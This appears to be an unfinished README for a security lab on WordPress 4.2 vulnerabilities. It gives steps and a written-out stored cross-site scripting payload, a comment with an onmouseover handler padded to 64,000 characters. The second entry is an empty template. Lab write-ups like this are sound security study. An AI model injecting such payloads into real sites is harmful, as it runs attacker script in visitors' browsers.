# README

Time Spent: 4 hours in total

Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

XXS

  - [ ] Summary: 
  
      I am using XSS with WP 4.2, which was fixed in version 4.2.1.
  - [ ] GIF Walkthrough:![](https://i.imgur.com/xslxj31.gif)
  - [ ] Steps to Recreate:
  
     You have to comment on a post and insert the following into a comment: 
     
     <a title='x onmouseover=alert(unescape(/hello%20world/.source))          style=position:absolute;left:0;top:0;width:5000px;height:5000px <You will then insert 64,000 of a character and hit comment>
  - [ ] Affected Source Code: 
      None
  
  
XXS

  - [ ] Summary:
  I am using XSS with WP 4.2, which was fixed in version 
  - [ ] GIF Walkthrough:
  - [ ] Steps to Recreate:
  - [ ] Affected Source Code:

